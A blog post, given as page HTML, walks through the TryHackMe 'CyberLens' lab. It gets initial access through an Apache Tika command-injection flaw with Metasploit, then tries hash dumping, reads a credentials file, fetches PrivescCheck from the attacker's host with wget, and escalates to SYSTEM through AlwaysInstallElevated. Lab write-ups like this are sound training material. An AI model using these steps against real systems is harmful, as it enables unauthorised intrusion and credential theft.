<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CyberLens TryHackMe Writeup | Mr Ash Co</title>
<meta name=keywords content="TryHackMe,Writeup"><meta name=description content="Okay, it&rsquo;s been a while. Last writeup on the blog is Chill Hack&mldr; but she (and other writeups) need a refresher.
Anyway, here&rsquo;s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make&rsquo;s great content, give them a follow/subscribe.
The Challenge First up, the Challenge Description.
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image."><meta name=author content="Mr Ash"><link rel=canonical href=//localhost:1313/cyberlens/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.5591f0f0e6da962274ad39d968be1ca571fe1593fa5f642efac68ccea21a574f.css integrity="sha256-VZHw8ObaliJ0rTnZaL4cpXH+FZP6X2Qu+saMzqIaV08=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href="https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer&amp;v=db94595858aad20b777e4f130cbe5006"><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/cyberlens/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="CyberLens TryHackMe Writeup"><meta property="og:description" content="Okay, it&rsquo;s been a while. Last writeup on the blog is Chill Hack&mldr; but she (and other writeups) need a refresher.
Anyway, here&rsquo;s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make&rsquo;s great content, give them a follow/subscribe.
The Challenge First up, the Challenge Description.
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image."><meta property="og:type" content="article"><meta property="og:url" content="//localhost:1313/cyberlens/"><meta property="og:image" content="https://i.imgur.com/zfu4dRJ_d.webp?maxwidth=1520&amp;fidelity=grand"><meta property="article:section" content="post"><meta property="article:published_time" content="2024-05-24T12:05:12+10:00"><meta property="article:modified_time" content="2024-05-24T12:05:12+10:00"><meta property="og:site_name" content="Mr Ash Co"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://i.imgur.com/zfu4dRJ_d.webp?maxwidth=1520&amp;fidelity=grand"><meta name=twitter:title content="CyberLens TryHackMe Writeup"><meta name=twitter:description content="Okay, it&rsquo;s been a while. Last writeup on the blog is Chill Hack&mldr; but she (and other writeups) need a refresher.
Anyway, here&rsquo;s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make&rsquo;s great content, give them a follow/subscribe.
The Challenge First up, the Challenge Description.
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/post/"},{"@type":"ListItem","position":2,"name":"CyberLens TryHackMe Writeup","item":"//localhost:1313/cyberlens/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CyberLens TryHackMe Writeup","name":"CyberLens TryHackMe Writeup","description":"Okay, it\u0026rsquo;s been a while. Last writeup on the blog is Chill Hack\u0026hellip; but she (and other writeups) need a refresher.\nAnyway, here\u0026rsquo;s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make\u0026rsquo;s great content, give them a follow/subscribe.\nThe Challenge First up, the Challenge Description.\nWelcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image.","keywords":["TryHackMe","Writeup"],"articleBody":"Okay, it’s been a while. Last writeup on the blog is Chill Hack… but she (and other writeups) need a refresher.\nAnyway, here’s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make’s great content, give them a follow/subscribe.\nThe Challenge First up, the Challenge Description.\nWelcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.\rIn this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.\rPicture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.\rAt CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.\rCan you exploit the CyberLens web server and discover the hidden flags? I thought this room might be more ‘image forensics’ related, but I guess that’s just the law of this CyberLens company.\nTyler, is the description AI generated? It’s okay if it is, no shame, just curious.\n[UPDATE] Yes, it’s AI. Tyler mentions it in his Official Walkthrough.\nThere’s a Things to Note which is nice.\nAdd the MACHINE_IP to /etc/hosts/ and wait 5 minutes. Done.\nBut the focus are two flags. 1) User, and 2) Administrator.\nA familiar room challenge.\nPerfect to get back into the swing of things.\nLet’s go.\nEnumeration Typically rustscan or nmap are normal starting points.\nBut since the description finished with “Can you exploit the CyberLens web server and discover the hidden flags?”\nIt’s easier to start on port 80 via cyberlens[.]thm.\nWith a quick look at WhatRuns and Wappalyzer, seems like an Apache Server running a basic html/css template on Bootstrap.\nNothing too interesting until scrolling down and seeing a form.\nAnd with a quick view-source, we’ve got an interesting end-point to look at.\nSince the web form is fetching via ‘http’, perhaps we can see something via the browser?\nAh, some sort of Apache service, with a version number. Interesting.\nSo, from searching Apache Tika it’s a toolkit (that) detects and extracts metadata from file types like PDFs etc.\nI guess this feeds into the CyberLens description from earlier.\nAnd from searching Apache Tika 1.17 Exploit we’ve got our in.\nSo it’s originally CVE-2018-1335 where a vulnerability “could be used to inject commands into the command line of the server running tika-server.”\nWe can also use searchsploit tika 1.17 if that’s your cup of tea.\nLooks like we have a Metasploit exploit ready to go, lovely.\nInitial Access Okay, let’s fire up this bad boy and see what we’ve got.\nUse msfconsole -q and then search tika to find our exploit.\nIt’s exploit/windows/http/apache_tika_jp2_jscript or type use 0 when it’s the first search item.\nSet the following options with set $option $value:\nRHOSTS = $MACHINE_IP RPORT = 61777 LHOST = $YOUR_IP For example, set LHOST 10.10.10.10 and then use run or go when you’re ready.\nThe user flag hint “Sometimes exploits take a few tries before they are successful ;)” comes in here.\nYou may need to try this once or twice to get it working. Just check your exploit options are correct.\nBut when the exploit works and a session is created, you’ll be greeted with:\nWe’re in. Now what? Well first, who are we?\nWith a quick whoami we’re the user cyberlens. Cool.\nThen since we’re in Meterpreter, there’s extra luxuries to try, like:\nsysinfo for some system background. getsystem for a quick priv esc attempt… no luck there. hashdump for a sneaky SAM database dump… again, no luck. Worth a quick try.\nOtherwise, let’s look around. Do what the kids call ‘manual enumeration’.\nWe can also drop a normal shell on the system using shell and then enter PowerShell with powershell.\nHere we can try some to see maybe some info about what we can do:\nwhoami /priv whoami /all If you’re like me, there’s a few rabbit holes to explore.\nWhat’s SeChangeNotifyPrivilege? Does it give me anything? Nope.\nLet’s just look around then.\nSome good places to check are:\nC:\\ C:\\Users C:\\Windows\\Temp Since we’re in PowerShell, use gci to list out contents.\n(Oh PowerShell, your commands are so simple to remember.)\nFor example, cd C:\\Users\\CyberLens and gci -recurse .\nAh, interesting. 1) user.txt, and 2) CyberLens-Management.txt\nAlright, now we have some credentials: CyberLens:H************3\nPrivilege Escalation I’ll be honest. I got stuck here, like really stuck.\nFor me, the hint didn’t help “RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389”\nSticking with a PowerShell terminal was the way to go for me.\nLet’s try some automated enumeration now.\nAfter a few rabbit holes, took a step back and watched Windows Privilege Escalation Guide.\nSo tried a new (for me) script called PrivesCheck.\nStart a Python Web Server with python -m http.server 8000 where you download the script.\nOn the Target Machine, put the script where you have write permissions. Like the Desktop.\nThen you can use wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file\nGo ahead and run the script . .\\PrivescCheck.ps1; Invoke-PrivescCheck\nGotta say, I do like the output of PrivescCheck. Easy to digest with the summary at the end.\nSo what’s AlwaysInstallElevated???\nLuckily, HackTricks has info about it.\nAnd there’s another metasploit exploit ready to rock for us. Lovely.\nExit PowerShell and go back to Meterpreter with exit and exit.\nThen bg that session and type use exploit/windows/local/always_install_elevated.\nSet the options for the exploit and run:\nset LHOST $YOUR_IP set SESSION 1 And look at that, authority\\system user.\nIt’s as good as being root on Linux… I think.\nThen cat C:\\Users\\Administrator\\Desktop\\admin.txt for the admin flag.\nReflection \u0026 Rabbit Holes CyberLens has been a great room, props to Tyler and TryHackMe.\nIt’s Easy rated, but the priv esc portion really stumped me.\nI went down a few Rabbit Holes:\nRDP led me replacing C:\\Apache24\\bin\\httpd.exe with a reverse shell. Then using a startup.bat which using a Visual Basics script to run httpd.exe. I thought I found a Windows 17763 exploit on exploit.db… nope. Then I followed Windows 11 Privilege Escalation via UAC Bypass (GUI based)… again, nope. With more Linux priv esc experience, this was a good room for me.\nThanks for reading\n","wordCount":"1160","inLanguage":"en","image":"https://i.imgur.com/zfu4dRJ_d.webp?maxwidth=1520\u0026fidelity=grand","datePublished":"2024-05-24T12:05:12+10:00","dateModified":"2024-05-24T12:05:12+10:00","author":{"@type":"Person","name":"Mr Ash"},"mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/cyberlens/"},"publisher":{"@type":"Organization","name":"Mr Ash Co","logo":{"@type":"ImageObject","url":"https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer\u0026v=db94595858aad20b777e4f130cbe5006"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="mrashco (Alt + H)">mrashco</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=//localhost:1313/now title=now><span>now</span></a></li><li><a href=//localhost:1313/blog title=blog><span>blog</span></a></li><li><a href=//localhost:1313/letter title=letters><span>letters</span></a></li><li><a href=//localhost:1313/search title=" (Alt + /)" accesskey=/><span><svg xmlns="http://www.w3.org/2000/svg" width="17.5" height="17.5" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/post/>Posts</a></div><h1 class=post-title>CyberLens TryHackMe Writeup</h1><div class=post-meta><span title='2024-05-24 12:05:12 +1000 AEST'>24/05/2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1160 words&nbsp;·&nbsp;Mr Ash&nbsp;|&nbsp;<a href=https://github.com/mrashco/mrash.co/tree/main/content/post/2024/cyberlens.md rel="noopener noreferrer" target=_blank>Suggest Edits</a></div></header><figure class=entry-cover><img loading=lazy src="https://i.imgur.com/zfu4dRJ_d.webp?maxwidth=1520&amp;fidelity=grand" alt></figure><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#the-challenge>The Challenge</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-access>Initial Access</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#reflection--rabbit-holes>Reflection & Rabbit Holes</a></li></ul></nav></div></details></div><div class=post-content><p>Okay, it&rsquo;s been a while. Last writeup on the blog is <a href=https://mrash.co/chill-hack/>Chill Hack</a>&mldr; but she (and other writeups) need a refresher.</p><p>Anyway, here&rsquo;s <a href=https://tryhackme.com/r/room/cyberlensp6>CyberLens</a>, a newish TryHackMe room from <a href=https://www.youtube.com/@TylerRamsbey>Tyler Ramsbey</a> who make&rsquo;s great content, give them a follow/subscribe.</p><h2 id=the-challenge>The Challenge<a hidden class=anchor aria-hidden=true href=#the-challenge>#</a></h2><p>First up, the Challenge Description.</p><pre tabindex=0><code class=language-plain-text data-lang=plain-text>Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags?
</code></pre><p>I thought this room might be more &lsquo;image forensics&rsquo; related, but I guess that&rsquo;s just the law of this CyberLens company.</p><p>Tyler, is the description AI generated? It&rsquo;s okay if it is, no shame, just curious.</p><p>[UPDATE] Yes, it&rsquo;s AI. Tyler mentions it in his <a href="https://youtu.be/eFWEwS5thu4?si=ptGJISHJlWbWGAWD">Official Walkthrough</a>.</p><p>There&rsquo;s a <strong>Things to Note</strong> which is nice.</p><p>Add the <code>MACHINE_IP</code> to <code>/etc/hosts/</code> and wait 5 minutes. Done.</p><p>But the focus are two flags. 1) User, and 2) Administrator.</p><p>A familiar room challenge.</p><p>Perfect to get back into the swing of things.</p><p>Let&rsquo;s go.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>Typically <code>rustscan</code> or <code>nmap</code> are normal starting points.</p><p>But since the description finished with &ldquo;Can you exploit the CyberLens <strong>web server</strong> and discover the hidden flags?&rdquo;</p><p>It&rsquo;s easier to start on port 80 via cyberlens[.]thm.</p><p><img loading=lazy src=https://i.imgur.com/Xjb7qCZ.jpeg alt="CyberLens Website"></p><p>With a quick look at WhatRuns and Wappalyzer, seems like an Apache Server running a basic html/css template on Bootstrap.</p><p><img loading=lazy src=https://i.imgur.com/1iT4X3m.png alt=Wappalyzer></p><p>Nothing too interesting until scrolling down and seeing a form.</p><p><img loading=lazy src=https://i.imgur.com/9ZHgSAR.png alt="CyberLens Website Form"></p><p>And with a quick view-source, we&rsquo;ve got an interesting end-point to look at.</p><p><img loading=lazy src=https://i.imgur.com/0DFddsE.png alt="Web Form Showing Port 61777"></p><p>Since the web form is fetching via &lsquo;http&rsquo;, perhaps we can see something via the browser?</p><p><img loading=lazy src=https://i.imgur.com/hqOId3k.png alt="Apache Tika"></p><p>Ah, some sort of Apache service, with a version number. Interesting.</p><p>So, from searching <strong>Apache Tika</strong> it&rsquo;s a <strong>toolkit (that) detects and extracts metadata</strong> from file types like PDFs etc.</p><p>I guess this feeds into the CyberLens description from earlier.</p><p>And from searching <strong>Apache Tika 1.17 Exploit</strong> we&rsquo;ve got our <em>in</em>.</p><p><img loading=lazy src=https://i.imgur.com/1fWQ7ot.png alt="Apache Tika 1.17 Exploit"></p><p>So it&rsquo;s originally <a href=https://nvd.nist.gov/vuln/detail/CVE-2018-1335>CVE-2018-1335</a> where a vulnerability &ldquo;could be used to inject commands into the command line of the server running tika-server.&rdquo;</p><p>We can also use <code>searchsploit tika 1.17</code> if that&rsquo;s your cup of tea.</p><p>Looks like we have a Metasploit exploit ready to go, lovely.</p><h2 id=initial-access>Initial Access<a hidden class=anchor aria-hidden=true href=#initial-access>#</a></h2><p>Okay, let&rsquo;s fire up this bad boy and see what we&rsquo;ve got.</p><p>Use <code>msfconsole -q</code> and then <code>search tika</code> to find our exploit.</p><p>It&rsquo;s <code>exploit/windows/http/apache_tika_jp2_jscript</code> or type <code>use 0</code> when it&rsquo;s the first search item.</p><p>Set the following options with <code>set $option $value</code>:</p><ul><li>RHOSTS = $MACHINE_IP</li><li>RPORT = 61777</li><li>LHOST = $YOUR_IP</li></ul><p>For example, <code>set LHOST 10.10.10.10</code> and then use <code>run</code> or <code>go</code> when you&rsquo;re ready.</p><p>The user flag hint &ldquo;Sometimes exploits take a few tries before they are successful ;)&rdquo; comes in here.</p><p>You may need to try this once or twice to get it working. Just check your exploit options are correct.</p><p>But when the exploit works and a session is created, you&rsquo;ll be greeted with:</p><p><img loading=lazy src=https://i.imgur.com/fybpy7B.png alt="Metasploit Tika Exploit Session"></p><p>We&rsquo;re in. Now what? Well first, who are we?</p><p>With a quick <code>whoami</code> we&rsquo;re the user <code>cyberlens</code>. Cool.</p><p>Then since we&rsquo;re in Meterpreter, there&rsquo;s extra luxuries to try, like:</p><ul><li><code>sysinfo</code> for some system background.</li><li><code>getsystem</code> for a quick priv esc attempt&mldr; no luck there.</li><li><code>hashdump</code> for a sneaky SAM database dump&mldr; again, no luck.</li></ul><p>Worth a quick try.</p><p>Otherwise, let&rsquo;s look around. Do what the kids call &lsquo;manual enumeration&rsquo;.</p><p>We can also drop a normal shell on the system using <code>shell</code> and then enter PowerShell with <code>powershell</code>.</p><p><img loading=lazy src=https://i.imgur.com/vGEq0YN.png alt="Meterpreter Shell To PowerShell"></p><p>Here we can try some to see maybe some info about what we can do:</p><ul><li><code>whoami /priv</code></li><li><code>whoami /all</code></li></ul><p><img loading=lazy src=https://i.imgur.com/YVc1k6n.png alt="whoami priv and whoami all"></p><p>If you&rsquo;re like me, there&rsquo;s a few rabbit holes to explore.</p><p>What&rsquo;s <code>SeChangeNotifyPrivilege</code>? Does it give me anything? Nope.</p><p>Let&rsquo;s just look around then.</p><p>Some good places to check are:</p><ul><li><code>C:\</code></li><li><code>C:\Users</code></li><li><code>C:\Windows\Temp</code></li></ul><p>Since we&rsquo;re in PowerShell, use <code>gci</code> to list out contents.</p><p>(Oh PowerShell, your commands are so simple to remember.)</p><p>For example, <code>cd C:\Users\CyberLens</code> and <code>gci -recurse .</code></p><p><img loading=lazy src=https://i.imgur.com/8WqfJFa.png alt="Recursive User Files"></p><p>Ah, interesting. 1) <code>user.txt</code>, and 2) <code>CyberLens-Management.txt</code></p><p><img loading=lazy src=https://i.imgur.com/cKWW22f.png alt="Displaying User Flag and CyberLens Credentials"></p><p>Alright, now we have some credentials: <code>CyberLens:H************3</code></p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>I&rsquo;ll be honest. I got stuck here, like really stuck.</p><p>For me, the <em>hint</em> didn&rsquo;t help &ldquo;RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389&rdquo;</p><p>Sticking with a PowerShell terminal was the way to go for me.</p><p>Let&rsquo;s try some automated enumeration now.</p><p>After a few rabbit holes, took a step back and watched <a href="https://youtu.be/w3v_ydcw3T4?si=llF_n2L0og3RkSon">Windows Privilege Escalation Guide</a>.</p><p>So tried a new (for me) script called <a href=https://github.com/itm4n/PrivescCheck>PrivesCheck</a>.</p><p><img loading=lazy src=https://i.imgur.com/kWKbJc2.png alt="Download PrivescCheck Script"></p><p>Start a Python Web Server with <code>python -m http.server 8000</code> where you download the script.</p><p><img loading=lazy src=https://i.imgur.com/6LhBV1v.png alt="Transfer PrivescCheck Script"></p><p>On the Target Machine, put the script where you have write permissions. Like the Desktop.</p><p>Then you can use <code>wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file</code></p><p>Go ahead and run the script <code>. .\PrivescCheck.ps1; Invoke-PrivescCheck</code></p><p>Gotta say, I do like the output of PrivescCheck. Easy to digest with the summary at the end.</p><p><img loading=lazy src=https://i.imgur.com/k4wFGdl.png alt="PrivescCheck Summary"></p><p>So what&rsquo;s <code>AlwaysInstallElevated</code>???</p><p>Luckily, <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation>HackTricks</a> has info about it.</p><p>And there&rsquo;s another metasploit exploit ready to rock for us. Lovely.</p><p>Exit PowerShell and go back to Meterpreter with <code>exit</code> and <code>exit</code>.</p><p>Then <code>bg</code> that session and type <code>use exploit/windows/local/always_install_elevated</code>.</p><p><img loading=lazy src=https://i.imgur.com/QWhWeN3.png alt="AlwaysInstallElevated Exploit"></p><p>Set the <code>options</code> for the exploit and <code>run</code>:</p><ul><li><code>set LHOST $YOUR_IP</code></li><li><code>set SESSION 1</code></li></ul><p><img loading=lazy src=https://i.imgur.com/iaY5jiw.png alt="AlwaysInstallElevated Exploit Options"></p><p>And look at that, <code>authority\system</code> user.</p><p>It&rsquo;s as good as being root on Linux&mldr; I think.</p><p><img loading=lazy src=https://i.imgur.com/LfNUgUb.png alt="AlwaysInstallElevated Exploit Running"></p><p>Then <code>cat C:\Users\Administrator\Desktop\admin.txt</code> for the admin flag.</p><p><img loading=lazy src=https://i.imgur.com/RQWAVPO.png alt="Admin Flag"></p><h2 id=reflection--rabbit-holes>Reflection & Rabbit Holes<a hidden class=anchor aria-hidden=true href=#reflection--rabbit-holes>#</a></h2><p>CyberLens has been a great room, props to Tyler and TryHackMe.</p><p>It&rsquo;s Easy rated, but the priv esc portion really stumped me.</p><p>I went down a few Rabbit Holes:</p><ul><li>RDP led me replacing <code>C:\Apache24\bin\httpd.exe</code> with a reverse shell. Then using a startup.bat which using a Visual Basics script to run <code>httpd.exe</code>.</li><li>I thought I found a <strong>Windows 17763</strong> exploit on <strong>exploit.db</strong>&mldr; nope.</li><li>Then I followed <a href=https://www.pwndefend.com/2021/08/23/windows-11-privilege-escalation-via-uac-bypass-gui-based/>Windows 11 Privilege Escalation via UAC Bypass (GUI based)</a>&mldr; again, nope.</li></ul><p>With more Linux priv esc experience, this was a good room for me.</p><hr><p>Thanks for reading</p><br><div class=gist-embed-form data-form-type=embedded data-form-id=1489913 data-workspace-id=aw3xhcat version=3></div><script type=text/javascript src=https://forms-widget.getgist.com/ defer></script></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/tryhackme/>TryHackMe</a></li><li><a href=//localhost:1313/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=next href=//localhost:1313/docker/><span class=title>Next »</span><br><span>Docker</span></a></nav></footer></article></main><footer class=footer><span>Made with ♥ from Australia</span> •
<span>&copy; 2017-2024 <a href=/policies>Policies</a><br>Site by <a href=//localhost:1313/>Mr Ash Co</a></span>
<span>• Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>
x
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>